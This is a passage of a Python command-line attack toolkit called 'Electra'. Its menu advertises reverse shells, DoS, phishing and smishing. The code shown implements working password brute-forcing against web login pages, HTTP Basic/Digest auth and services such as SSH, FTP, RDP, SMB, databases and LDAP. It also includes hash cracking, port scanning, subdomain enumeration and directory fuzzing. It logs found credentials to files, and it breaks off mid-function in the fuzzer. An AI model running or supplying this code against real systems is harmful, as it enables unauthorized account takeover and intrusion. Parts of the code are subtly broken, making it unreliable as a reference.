#!/usr/bin/env python3
#import pymongo.errors
import dns.resolver
import concurrent.futures
import click, sys, os, socket, requests, platform, psutil, subprocess, hashlib, bcrypt, paramiko, ftplib, time, poplib, imaplib, vncdotool, pymysql, pymongo, psycopg2, ldap3, ssl, itertools, pyshark, base64, pysip, boto3, re, json, random
#import telnetlib (Deprecated in python 3.13)
import requests.auth
from smbprotocol.connection import Connection
from smbprotocol.session import Session
import vncdotool.api
from hashid import HashID
from bs4 import BeautifulSoup
from scapy.all import sniff, wrpcap, rdpcap
import urllib.parse
from twilio.rest import Client
from azure.identity import DefaultAzureCredential
from azure.mgmt.resource import ResourceManagementClient
from google.cloud import storage
from winrm import Session
from scapy.all import (Dot11Beacon, Dot11Elt)
from paho import mqtt
from aiocoap import Context, Message
from aiocoap.numbers.codes import GET
import xml.etree.ElementTree as ET #Deprecated
import cryptography.hazmat.primitives.asymmetric.rsa as rsa
from cryptography.hazmat.primitives.serialization import load_pem_private_key
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from OpenSSL import crypto

BANNER = """
███████╗██╗     ███████╗ ██████╗████████╗██████╗  █████╗ 
██╔════╝██║     ██╔════╝██╔════╝╚══██╔══╝██╔══██ ██╔══██╗
█████╗  ██║     █████╗  ██║        ██║   █████╔╝ ███████║
██╔══╝  ██║     ██╔══╝  ██║        ██║   ██  ██╗ ██╔══██║
███████╗███████╗███████╗╚██████╗   ██║   ██║  ██╗██║  ██║
═══════╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ v1.5

Electra - The master plan plotter.
"""

class BannerGroup(click.Group):
    def get_help(self, ctx):
        click.echo(BANNER)
        return super().get_help(ctx)
    
    def format_commands(self, ctx, formatter):
        commands = [
            #("cdir", "Create a new directory in a specified path."),
            ("sscan", "Perform a system scan."),
            ("nscan", "Perform a network scan."),
            ("webpass", "Web Dictionary Password Brute Force Attack."),
            ("webuser", "Web Dictionary Username Brute Force Attack."),
            ("hashgen", "Generate hash of a specific password."),
            ("hashcrk", "Crack a hash or a list of hashes."),
            ("srvatk", "Services Dictionary Password Brute Force attack."),
            ("webatk", "Web (Basic & Digest) Username/Password Brute Force attack."),
            ("subenum", "Subdomain enumeration (Passive & Active)."),
            ("fuzz", "Fuzz directories and files."),
            ("revsh", "Reverse Shell Handler."),
            ("netstr", "Perform DoS/DDoS attack."),
            ("encheck", "Perform service encryption analysis."),
            ("exploit", "Search an exploit."),
            ("passperm", "Perform password permutations."),
            ("nanal", "Perform network analysis. Capture and Analyse packets."),
            ("codec", "Perform encoding & decoding."),
            ("phish", "Generate phishing emails or login pages."),
            ("dwrecon", "Perform Dark Web Reconnaissance."),
            ("soceng", "Perform Social Engineering attacks (Smishing & Vishing)."),
            ("cloudsec", "Enumerate S3 buckets. Check for misconfigurations. Assess IAM Policies."),
            ("privescdet", "Privilege Escalation Detection."),
            ("wifiatk", "Perform handshake captures. Analyze signal strength. Detect rogue APs. Crack WPA/WPA2 passwords."),
            ("iotsec", "Scan and exploit IoT devices."),
            ("xsscan", "Scan for XSS vulnerabilities."),
            ("cryptaudit", "Assess cryptographic implementations."),
            ("csrf", "Scan for CSRF vulnerabilities."),
            ("ssrf", "Scan for SSRF vulnerabilities.")
        ]
        with formatter.section("Commands"):
            for cmd, desc in commands:
                formatter.write_text(f"{cmd:<10} {desc}")
        #return super().format_commands(ctx, formatter)

#HELP COMMAND
@click.group(cls=BannerGroup)
@click.option("-h", "--help", is_flag=True, expose_value=False, is_eager=True, callback=lambda ctx, param, value: click.echo(ctx.get_help()) if value else None, help="Show this help message and exit.")
def cli():
    click.echo(BANNER)

#CDIR COMMAND
@cli.command()
@click.option("-n", "--name", default="Directory", prompt="Enter dir name", help="Name of the directory to create. Default name is 'Directory'.")
@click.option("-p", "--path", default=None, help="Path where the directory should be created. Default is current working directory.")
def cdir(name, path):
    #Check whether OS is Linux
    if os.name != "posix":
        click.echo(click.style("[~] This function is only supported on Linux systems.", fg="magenta"))
        return
    
    #Set default path
    if not path:
        path = os.getcwd()
        click.echo(click.style(f"[~] No path specified. Using current directory: {path}", fg="magenta"))
    
    #Construct the full directory path
    full_path = os.path.join(path, name)

    try:
        os.makedirs(full_path, exist_ok=True)
        click.echo(click.style(f"[!] Dir: '{name}' created successfully at {full_path}", fg="green"))
    except PermissionError:
        click.echo(click.style("[!] Error: Permission denied. Try running with elevated privileges.", fg="red"))
    except FileExistsError:
        click.echo(click.style("[!] Error: Dir already exists.", fg="red"))
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

#SSCAN COMMAND
@cli.command()
@click.option("-h", "--hostname", required=True, prompt="Hostname", help="Hostname of the system to scan.")
def sscan(hostname):
    click.echo(click.style(f"[*] Starting system scan for host: {hostname}", fg="blue"))
    try:
        #Resolve IP of the host
        ip = socket.gethostbyname(hostname)
        click.echo(click.style(f"[!] Resolved IP address: {ip}", fg="green"))
        #Perform ping test
        response = os.system(f"ping -c 4 {ip}")
        if response == 0:
            click.echo(click.style(f"[!] Host: {hostname} with IP address: {ip} is reachable.", fg="green"))
        else:
            click.echo(click.style(f"[!] Host: {hostname} with IP address: {ip} is not reachable.", fg="red"))
            return
        
        #OS and system info
        click.echo(click.style("\n[*] Gathering OS and System info ...", fg="blue"))
        os_name = platform.system()
        os_version = platform.version()
        architecture = platform.machine()
        click.echo(click.style(f"[!] OS: {os_name}", fg="green"))
        click.echo(click.style(f"[!] OS Version: {os_version}", fg="green"))
        click.echo(click.style(f"[!] Architecture: {architecture}", fg="green"))
        click.echo(click.style("[--------------------------------]", fg="yellow"))
        cpu_cores = psutil.cpu_count(logical=False)
        total_mem = psutil.virtual_memory().total // (1024 ** 2)
        click.echo(click.style(f"[!] CPU Cores: {cpu_cores}", fg="green"))
        click.echo(click.style(f"[!] Total Mem: {total_mem} MBs", fg="green"))
        click.echo(click.style("[--------------------------------]", fg="yellow"))
        #Network info
        for interfaces, addresses in psutil.net_if_addrs().items():
            click.echo(click.style(f"[!] Network Interface: {interfaces}", fg="green"))
            click.echo(click.style(""))
            for address in addresses:
                if address.family == socket.AF_INET:
                    click.echo(click.style(f"[!] IPv4: {address.address}", fg="green"))
                elif address.family == socket.AF_INET6:
                    click.echo(click.style(f"[!] IPv6: {address.address}", fg="green"))
                elif address.family == psutil.AF_LINK:
                    click.echo(click.style(f"[!] MAC: {address.address}", fg="green"))
            click.echo(click.style(""))

        click.echo(click.style("[--------------------------------]", fg="yellow"))
        #AD info (if os == windows)
        if os_name == "Windows":
            try:
                ad_domain = subprocess.check_output("net config workstation", shell=True).decode()
                if "Workstation Domain" in ad_domain:
                    click.echo(click.style("[!] AD Domain detected.", fg="green"))
                else:
                    click.echo(click.style("[!] No AD Domain detected.", fg="red"))
            except Exception as e:
                click.echo(click.style("[!] Could not retrieve AD Domain info.", fg="red"))
        else:
            click.echo(click.style("[!] Host OS is not Windows. No AD Domain detected.", fg="red"))
    
    except socket.gaierror:
        click.echo(click.style(f"[!] Error: Hostname: {hostname} could not be resolved.", fg="red"))
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

#NSCAN COMMAND
@cli.command()
@click.option("-h", "--host", required=True, help="Target IP, Socket or hostname for network scan.")
@click.option("-p", "--port", default="1-1024", help="Port (range) to scan. Default 1-1024.")
@click.option("-t", "--tcp", is_flag=True, help="Perform TCP scan.")
@click.option("-u", "--udp", is_flag=True, help="Perform UDP scan.")
@click.option("-s", "--stealth", is_flag=True, help="Perform a stealth scan. Requires root privileges.")
@click.option("-l", "--loud", is_flag=True, help="Perform a loud scan. (No delays between scans)")
def nscan(host, port, tcp, udp, stealth, loud):
    first_port, last_port = map(int, port.split("-"))
    scan_type = "Stealth" if stealth else "Loud"
    click.echo(click.style(f"[*] Starting {scan_type} network scan on {host} ...", fg="blue"))
    for port in range(first_port, last_port + 1):
        if tcp:
            try:
                socketer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socketer.settimeout(3)
                result = socketer.connect_ex((host, port))
                if result == 0:
                    click.echo(click.style(f"[!] Open TCP port: {port}", fg="green"))
                socketer.close()
            except Exception as e:
                click.echo(click.style(f"[!] TCP scan error on port {port}. {e}", fg="red"))
        if udp:
            try:
                socketer = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                socketer.settimeout(3)
                socketer.sendto(b'', (host, port))
                socketer.recvfrom(1024)
                click.echo(click.style(f"[!] Open UDP port: {port}", fg="green"))
            except socket.timeout:
                click.echo(click.style(f"[!] Timeout! Port: {port} may be filtered.", fg="yellow"))
            except Exception as e:
                click.echo(click.style(f"[!] UDP scan error on port {port}. {e}", fg="red"))
            finally:
                socketer.close()
        if not loud:
            time.sleep(0.2) #Delay to reduce loudness
    click.echo(click.style(f"[*] Network scan on {host} completed.", fg="blue"))

#WEBPASS COMMAND
@cli.command()
@click.option("-u", "--url", prompt="Target URL", help="URL of the target authentication page.")
@click.option("-U", "--username", prompt="Username", help="Username for authentication.")
@click.option("-w", "--wordlist", type=click.Path(exists=True), prompt="Wordlist path", help="Path to the password wordlist.")
def webpass(url, username, wordlist):
    click.echo(click.style(f"[*] Starting password wordlist BF attack on: {url} ...", fg="blue"))
    try:
        with open(wordlist, "r") as file:
            for password in file:
                password = password.strip()
                response = requests.post(url, data={"username": username, "password": password})
                if "login failed! invalid username or password." not in response.text.lower(): #invalid einai to failure http response tis selidas
                    click.echo(click.style(f"[!] Found password: {password}", fg="green"))
                    #Save password to a file
                    with open("Electra-Found-Passwords.txt", "a") as found_passwords:
                        found_passwords.write(f"URL: {url}, Username: {username}, Password: {password}\n")
                    return
                else:
                    click.echo(click.style(f"[!] Attempt with password: '{password}' failed.", fg="red"))
        
        click.echo(click.style("[!] Web Password Wordlist BF attack completed. No valid passwords found.", fg="magenta"))
    
    except requests.RequestException as e:
        click.echo(click.style(f"[!] Error: {e}. Connection to: {url} failed.", fg="red"))
    except FileNotFoundError:
        click.echo(click.style(f"[!] Error: Wordlist file not found.", fg="red"))

#WEBUSER COMMAND
@cli.command()
@click.option("-u", "--url", prompt="Target URL", help="URL of the target authentication page.")
@click.option("-p", "--password", prompt="Password", help="Password for authentication.")
@click.option("-w", "--wordlist", type=click.Path(exists=True), prompt="Wordlist path", help="Path to the username wordlist.")
def webuser(url, password, wordlist):
    click.echo(click.style(f"[*] Starting username wordlist BF attack on: {url} ...", fg="blue"))
    try:
        with open(wordlist, "r") as file:
            for username in file:
                username = username.strip()
                response = requests.post(url, data={"username": username, "password": password})
                if "login failed! invalid username or password." not in response.text.lower(): #invalid einai to failure http response tis selidas
                    click.echo(click.style(f"[!] Found username: {username}", fg="green"))
                    #Save username to a file
                    with open("Electra-Found-Usernames.txt", "a") as found_usernames:
                        found_usernames.write(f"URL: {url}, Username: {username}, Password: {password}\n")
                    return
                else:
                    click.echo(click.style(f"[!] Attempt with username: '{username}' failed.", fg="red"))
        
        click.echo(click.style("[!] Web Username Wordlist BF attack completed. No valid usernames found.", fg="magenta"))
    
    except requests.RequestException as e:
        click.echo(click.style(f"[!] Error: {e}. Connection to: {url} failed.", fg="red"))
    except FileNotFoundError:
        click.echo(click.style(f"[!] Error: Wordlist file not found.", fg="red"))

#HASHGEN COMMAND
@cli.command()
@click.option("-f", "--function", type=click.Choice(["md5", "sha1", "sha224", "sha256", "sha384", "sha512", "sha3_224", "sha3_256", "sha3_384", "sha3_512" "bcrypt"], case_sensitive=False), required=True, help="Hash function (MD5, SHA1, BCrypt, etc).")
@click.option("-p", "--password", required=True, help="Password to hash.")
def hashgen(function, password):
    #Generate hash based on selected func
    click.echo(click.style(f"[*] Generating the hash of: {password} using: {function}.", fg="blue"))
    if function == "md5":
        hashed_pass = hashlib.md5(password.encode()).hexdigest()
    elif function == "sha1":
        hashed_pass = hashlib.sha1(password.encode()).hexdigest()
    elif function == "sha224":
        hashed_pass = hashlib.sha224(password.encode()).hexdigest()
    elif function == "sha256":
        hashed_pass = hashlib.sha256(password.encode()).hexdigest()
    elif function == "sha384":
        hashed_pass = hashlib.sha384(password.encode()).hexdigest()
    elif function == "sha512":
        hashed_pass = hashlib.sha512(password.encode()).hexdigest()
    elif function == "sha3_224":
        hashed_pass = hashlib.sha3_224(password.encode()).hexdigest()
    elif function == "sha3_256":
        hashed_pass = hashlib.sha3_256(password.encode()).hexdigest()
    elif function == "sha3_384":
        hashed_pass = hashlib.sha3_384(password.encode()).hexdigest()
    elif function == "sha3_512":
        hashed_pass = hashlib.sha3_512(password.encode()).hexdigest()
    elif function == "bcrypt":
        salt = bcrypt.gensalt()
        hashed_pass = bcrypt.hashpw(password.encode(), salt).decode()
    
    click.echo(click.style(f"[!] {function.upper()} hash of '{password}' is {hashed_pass}", fg="green"))
    #Save hash to a file
    with open("Electra-Hashed-Passwords.txt", "a") as hashed_passwords:
        hashed_passwords.write(f"{function.upper()} hash: {hashed_pass}, Password: {password}\n")
    click.echo(click.style("[!] Hash successfully saved to Electra-Hashed-Passwords.txt", fg="green"))

#HASHCRK COMMAND
@cli.command()
@click.option("-h", "--hash", help="Hash to crack.")
@click.option("-l", "--hashlist", type=click.Path(exists=True), help="Path to the list of hashes.")
@click.option("-w", "--wordlist", type=click.Path(exists=True), required=True, help="Path to the password wordlist.")
@click.option("-t", "--type", type=click.Choice(["md5", "sha1", "sha224", "sha256", "sha384", "sha512", "sha3_224", "sha3_256", "sha3_384", "sha3_512" "bcrypt"], case_sensitive=False), help="Hash type. (e.g. MD5, SHA1 etc)")
def hashcrk(hash, hashlist, wordlist, type):
    hashid = HashID()
    hash_targets = []
    if hash:
        hash_targets.append((hash, type or hashid.identifyHash(hash)))
    elif hashlist:
        with open(hashlist, "r") as file:
            for line in file:
                hash_value = line.strip()
                hash_type = type or hashid.identifyHash(hash_value)
                hash_targets.append((hash_value, hash_type))
            #hash_targets = [(line.strip(), type or hashid.identifyHash(line.strip())) for line in file]
    
    with open(wordlist, "r") as file:
        for password in file:
            password = password.strip()
            for h, htype in hash_targets:
                computed_hash = hashlib.new(htype, password.encode()).hexdigest()
                if computed_hash == h:
                    click.echo(click.style(f"[!] Hash: {h} cracked! Password: {password}", fg="green"))
                    break

#SERVATK COMMAND
@cli.command()
@click.option("-s", "--service", type=click.Choice(["ssh", "ftp", "rdp", "smb", "pop3", "imap", "telnet", "vnc", "mysql", "mongodb", "postgresql", "ldap"], case_sensitive=False), required=True, help="Specify the service to attack (SSH, FTP, etc).")
@click.option("-h", "--host", required=True, help="IP, Socket or Hostname of the target.")
@click.option("-u", "--username", required=True, help="Username for authentication.")
@click.option("-w", "--wordlist", type=click.Path(exists=True), required=True, help="Path to password wordlist.")
#@click.option("-id", "--guid", default=None, help="Unique session identifier. (For cases where two services are running. e.g. smb)")
def srvatk(service, host, username, wordlist):
    click.echo(click.style(f"[*] Starting {service.upper()} BF attack on {host} ...", fg="blue"))
    try:
        with open(wordlist, "r") as file:
            for password in file:
                password = password.strip()
                if service == "ssh":
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    try:
                        client.connect(host, username=username, password=password, timeout=5)
                        click.echo(click.style(f"[!] Found SSH password of user: {username} is {password}", fg="green"))
                        client.close()
                        #Save ssh password to a file
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                            click.echo(click.style("[!] Found password successfully saved to Electra-Found-Service-Passwords.txt", fg="green"))
                        return
                    except paramiko.AuthenticationException:
                        click.echo(click.style(f"[!] SSH authentication attempt with '{password}' failed.", fg="red"))
                    except Exception as e:
                        click.echo(click.style(f"[!] SSH connection error: {e}", fg="red"))
                elif service == "ftp":
                    try:
                        ftp = ftplib.FTP(host)
                        ftp.login(user=username, passwd=password)
                        click.echo(click.style(f"[!] Found FTP password of user: {username} is {password}", fg="green"))
                        ftp.quit()
                        #Save ftp password to a file
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                            click.echo(click.style("[!] Found password successfully saved to Electra-Found-Service-Passwords.txt", fg="green"))
                        return
                    except ftplib.error_perm:
                        click.echo(click.style(f"[!] FTP authentication attempt with '{password}' failed.", fg="red"))
                    except Exception as e:
                        click.echo(click.style(f"[!] FTP connection error: {e}", fg="red"))
                elif service == "rdp":
                    try:
                        connection = subprocess.run(
                            ["xfreerdp", f"/v:{host}", f"/u:{username}", f"/p:{password}", "/cert-ignore", "/auth-only"], capture_output=True, text=True
                        )
                        #if "Authentication only, exit status 0" in connection.stderr:

                        if connection.returncode == 0:
                            click.echo(click.style(f"[!] Found RDP password of user: {username} is {password}", fg="green"))
                            #Save rdp password to a file
                            with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                                service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                                click.echo(click.style("[!] Found password successfully saved to Electra-Found-Service-Passwords.txt", fg="green"))
                            return
                        else:
                            click.echo(click.style(f"[!] RDP authentication attempt with '{password}' failed.", fg="red"))
                    except Exception as e:
                        click.echo(click.style(f"[!] RDP connection error: {e}", fg="red"))
                elif service == "smb":
                    try:
                        smb_connection = Connection(guid="some-unique-id", username=username, password=password, server=host, port=445) #Thelei tropopoiisi se periptosi pou xrisimopoiithei to option -id
                        smb_connection.connect()
                        smb_session = Session(smb_connection)
                        smb_session.connect()
                        click.echo(click.style(f"[!] Found SMB password of user: {username} is {password}", fg="green"))
                        #Save smb password to a file
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Host: {host}, Username: {username}, Password: {password}\n")
                            click.echo(click.style(f"[!] Found password successfully saved to Electra-Found-Service-Passwords.txt", fg="green"))
                        smb_session.disconnect()
                        smb_connection.disconnect()
                        return
                    except Exception as e:
                        click.echo(click.style(f"[!] SMB authentication attempt with {password} failed.", fg="red"))
                elif service == "pop3":
                    try:
                        pop3_connection = poplib.POP3(host)
                        pop3_connection.user(username)
                        pop3_connection.pass_(password)
                        click.echo(click.style(f"[!] Found POP3 password for user: {username} is {password}", fg="green"))
                        pop3_connection.quit()
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                        return
                    except poplib.error_proto:
                        click.echo(click.style(f"[!] POP3 authentication attempt with {password} failed.", fg="red"))
                    except Exception as e:
                        click.echo(click.style(f"[!] POP3 connection error: {e}", fg="red"))
                elif service == "imap":
                    try:
                        imap_connection = imaplib.IMAP4(host)
                        imap_connection.login(username, password)
                        click.echo(click.style(f"[!] Found IMAP password for user: {username} is {password}", fg="green"))
                        imap_connection.logout()
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                        return
                    except imaplib.IMAP4.error:
                        click.echo(click.style(f"[!] IMAP authentication attempt with {password} failed.", fg="red"))
                    except Exception as e:
                        click.echo(click.style(f"[!] IMAP connection error: {e}", fg="red"))
                elif service == "vnc":
                    try:
                        vnc_connection = vncdotool.api.connect(host)
                        vnc_connection.password(password)
                        click.echo(click.style(f"[!] Found VNC password for user: {username} is {password}", fg="green"))
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                        vnc_connection.disconnect()
                        return
                    except vncdotool.api.VNCDoException:
                        click.echo(click.style(f"[!] VNC authentication attempt with {password} failed.", fg="red"))
                    except Exception as e:
                        click.echo(click.style(f"[!] VNC connection error: {e}", fg="red"))
                elif service == "mysql":
                    try:
                        mysql_connection = pymysql.connect(host=host, user=username, password=password)
                        click.echo(click.style(f"[!] Found MySQL password for user: {username} is {password}", fg="green"))
                        mysql_connection.close()
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                        return
                    except pymysql.MySQLError:
                        click.echo(click.style(f"[!] MySQL authentication attempt with {password} failed.", fg="red"))
                elif service == "mongodb":
                    try:
                        mongodb_connection = pymongo.MongoClient(f"mongodb://{username}:{password}@{host}")
                        mongodb_connection.admin.command("ping") #Test connection
                        click.echo(click.style(f"[!] Found MongoDB password for user: {username} is {password}", fg="green"))
                        mongodb_connection.close()
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                        return
                    #except pymongo.errors.OperationFailure:
                    #    click.echo(click.style(f"[!] MongoDB authentication attempt with {password} failed.", fg="red"))
                    except Exception as e:
                        click.echo(click.style(f"[!] MongoDB connection error: {e}", fg="red"))
                elif service == "postgresql":
                    try:
                        postgresql_connection = psycopg2.connect(host=host, user=username, password=password)
                        click.echo(click.style(f"[!] Found PostgreSQL password for user: {username} is {password}", fg="green"))
                        postgresql_connection.close()
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                        return
                    except psycopg2.OperationalError:
                        click.echo(click.style(f"[!] PostgreSQL authentication attempt with {password} failed.", fg="red"))
                elif service == "ldap":
                    ldap_server = ldap3.Server(host, get_info=ldap3.NONE)
                    ldap_connection = ldap3.Connection(ldap_server, user=username, password=password)
                    if ldap_connection.bind():
                        click.echo(click.style(f"[!] Found LDAP password for user: {username} is {password}", fg="green"))
                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                        ldap_connection.unbind()
                        return
                    else:
                        click.echo(click.style(f"[!] LDAP authentication attempt with {password} failed.", fg="red"))
                    ldap_connection.unbind()
                """Commented due to deprecation
                elif service == "telnet":
                    try:
                        telnet_connection = telnetlib.Telnet(host, timeout=5)
                        telnet_connection.read_until(b"login: ")
                        telnet_connection.write(username.encode("ascii") + b"\n")
                        telnet_connection.read_until(b"Password: ")
                        telnet_connection.write(password.encode("ascii") + b"\n")
                        #Check login
                        response = telnet_connection.read_some().decode("ascii")
                        if "incorrect" not in response.lower():
                            click.echo(click.style(f"[!] Found Telnet password for user: {username} is {password}", fg="green"))
                            with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
                                service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
                            telnet_connection.close()
                            return
                        else:
                            click.echo(click.style(f"[!] Telnet authentication attempt with {password} failed.", fg="red"))
                        telnet_connection.close()
                    except EOFError:
                        click.echo(click.style(f"[!] Telnet connection closed unexpectedly.", fg="red"))
                    except Exception as e:
                        click.echo(click.style(f"[!] Telnet connection error: {e}", fg="red"))
                """

        click.echo(click.style(f"[!] {service.upper()} BF attack completed. No valid passwords found.", fg="magenta"))
    except FileNotFoundError:
        click.echo(click.style(f"[!] Error: Wordlist file not found.", fg="red"))
    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

#WEBATK COMMAND
@cli.command()
@click.option("-u", "--url", required=True, prompt="Target URL", help="URL of the target authentication page.")
@click.option("-U", "--username", required=False, help="Use a specific username for authentication. If ommited, a username wordlist must be provided.")
@click.option("-uw", "--user-wordlist", type=click.Path(exists=True), help="Path to username wordlist. (For Brute-Forcing usernames)")
@click.option("-pw", "--pass-wordlist", type=click.Path(exists=True), help="Path to password wordlist.")
@click.option("-m", "--auth-method", type=click.Choice(["basic", "digest"], case_sensitive=False), required=True, help="Authentication method (basic or digest).")
def webatk(url, username, user_wordlist, pass_wordlist, auth_method):
    click.echo(click.style(f"[*] Starting {auth_method.upper()} authentication BF attack on: {url}", fg="blue"))
    try:
        usernames = [username] if username else open(user_wordlist).read().splitlines()
        passwords = open(pass_wordlist).read().splitlines()

        for user in usernames:
            for password in passwords:
                auth = requests.auth.HTTPBasicAuth(user, password) if auth_method == "basic" else requests.auth.HTTPDigestAuth(user, password)
                response = requests.get(url, auth=auth)

                if response.status_code == 200:
                    click.echo(click.style(f"[!] Credentials found! Username: {user} Password: {password}", fg="green"))
                    with open("Electra-Found-Web-Passwords.txt", "a") as found_creds:
                        found_creds.write(f"URL: {url}, Username: {user}, Password: {password}, Auth Method: {auth_method.upper()}\n")
                    return
                else:
                    click.echo(click.style(f"[!] Failed authentication attempt with username: {user} and password: {password}", fg="red"))
        click.echo(click.style(f"[!] {auth_method.upper()} HTTP/HTTPS BF attack completed. No valid credentials found.", fg="magenta"))
    except requests.RequestException as e:
        click.echo(click.style(f"[!] Request Error: {e}. Connection to: {url} failed.", fg="red"))
    except FileNotFoundError as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

#SUBENUM COMMAND
@cli.command()
@click.option("-d", "--domain", required=True, help="Target domain for subdomain enumeration.")
@click.option("-p", "--passive", is_flag=True, help="Passive subdomain enumeration.")
@click.option("-a", "--active", is_flag=True, help="DNS brute forcing for subdomain enumeration.")
@click.option("-w", "--wordlist", default="subdomains.txt", help="Path to wordlist for brute forcing.")
def subenum(domain, passive, active, wordlist):
    click.echo(click.style(f"[*] Starting subdomain enumeration for: {domain}", fg="blue"))
    results = []
    #Passive enumeration
    if passive:
        click.echo(click.style(f"[*] Executing passive subdomain enumeration...", fg="blue"))
        passive_results = passive_enum(domain)
        click.echo(click.style(f"[!] Passive Subdomain Enumeration results: {passive_results}", fg="green"))
        #Friendly output
        #for sub in passive_results:
        #    click.echo(click.style(f"{sub}", fg="green"))
    
    #DNS BF enumeration
    if active:
        click.echo(click.style(f"[*] Executing DNS Brute Force enumeration...", fg="blue"))
        active_results = active_enum(domain, wordlist)
        click.echo(click.style(f"[!] Active Subdomain Enumeration results: {active_results}", fg="green"))
        #Friendly output
        #for sub, ip in active_results:
        #    click.echo(click.style(f"{sub} on {ip}", fg="green"))
    
    if not passive and not active:
        click.echo(click.style(f"[!] Option -p (passive) or -a (active) is required.", fg="magenta"))
        return
    
    save_results(domain, results)

def passive_enum(domain):
    subdomains = []
    try:
        response = requests.get(f"https://api.hackertarget.com/hostsearch/?q={domain}")
        if response.status_code == 200:
            subdomains = [line.split(",")[0] for line in response.text.splitlines()]
            click.echo(click.style(f"[!] Found {len(subdomains)} subdomains using passive enumeration.", fg="green"))
        else:
            click.echo(click.style(f"[!] Error: Could not retrieve data from source", fg="red"))
    except Exception as e:
        click.echo(click.style(f"[!] Passive enumeration failed: {e}", fg="red"))
    return subdomains

def active_enum(domain, wordlist):
    subdomains = []
    resolver = dns.resolver.Resolver()
    try:
        with open(wordlist, "r") as file:
            for subdomain in file:
                subd = f"{subdomain.strip()}.{domain}"
                try:
                    results = resolver.resolve(subd, "A")
                    for result in results:
                        subdomains.append((subd, result.to_text()))
                        click.echo(click.style(f"[!] Found subdomain: {subd} on {result.to_text()}", fg="green"))
                except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.Timeout):
                    continue
    except FileNotFoundError:
        click.echo(click.style(f"[!] Error: Wordlist '{wordlist}' not found", fg="red"))
    except Exception as e:
        click.echo(click.style(f"[!] Active enumeration failed: {e}", fg="red"))
    return subdomains

def save_results(domain, results):
    try:
        with open("Electra-Found-Subdomains.txt", "a") as file:
            file.write(f"Domain: {domain}\n")
            file.write("Subdomain Enumeration Results:")
            for result in results:
                if len(result) == 1:
                    subdomain, enum_type = result
                    file.write(f"{subdomain} (Type: {enum_type})")
                elif len(result) == 2:
                    subdomain, enum_type, ip = result
                    file.write(f"{subdomain} on {ip} (Type: {enum_type})")
        click.echo(click.style(f"[!] Results successfully saved to Electra-Found-Subdomains.txt.", fg="green"))
    except Exception as e:
        click.echo(click.style(f"[!] Error: Could not save results to file. {e}", fg="red"))

#FUZZ COMMAND
@cli.command()
@click.option("-u", "--url", required=True, help="Target URL to fuzz.")
@click.option("-w", "--wordlist", required=True, type=click.Path(exists=True), help="Wordlist file for attack.")
@click.option("-pw", "--param-wordlist", type=click.Path(exists=True), help="Wordlist for parameter names.")
@click.option("-vw", "--value-wordlist", type=click.Path(exists=True), help="Wordlist for parameter values.")
@click.option("-e", "--extensions", default=None, help="Comma-Nospace-Seperated list of extensions to test. Default = .php,.html,.bak")
@click.option("-c", "--concurrency", default=5, type=int, help="Number of concurrent requests. Default = 5")
@click.option("-m", "--method", default="GET", type=click.Choice(["GET", "POST"], case_sensitive=False), help="HTTP method to use. Default = GET")
@click.option("-s", "--status", default="200", help="Comma-seperated status codes to display. Default = 200")
@click.option("-t", "--timeout", default=5, type=int, help="Timeout for each request in seconds. Default = 5")
def fuzz(url, wordlist, param_wordlist, value_wordlist, extensions, concurrency, method, status, timeout):
    valid_status_codes = [int(code.strip()) for code in status.split(",")]
    extension_list = extensions.split(",") if extensions else [""]
    try:
        with open(wordlist, "r") as file:
            words = [line.strip() for line in file]
        params = []
        values = []
        if param_wordlist:
            with open(param_wordlist, "r") as file:
                params = [line.strip() for line in file]
        if value_wordlist:
            with open(value_wordlist, "r") as file:
                values = [line.strip() for line in file]
    except FileNotFoundError as e:
        click.echo(click.style(f"[!] Wordlist not found. {e}", fg="red"))
        return
    
    def fuzz_path(path):
        for ext in extension_list:
            full_url = f"{url}/{path}{ext}"
            try:
                response = requests.request(method, full_url, timeout=timeout)
                if response.status_code in valid_status_codes:
                    click.echo(click.style(f"[!] Found: {full_url} (Status: {response.status_code})", fg="green"))
            except requests.RequestException:
                click.echo(click.style(f"[!] Error visiting {full_url}", fg="red"))
    
    def fuzz_params():
        for param in params:
            for value in values:
                param_url = f"{url}?"
                param_data = {param: value}
                try:
                    if method.upper() == "GET":
                        response = requests.get(param_url, params=param_data, timeout=timeout)
                    elif method.upper() == "POST":
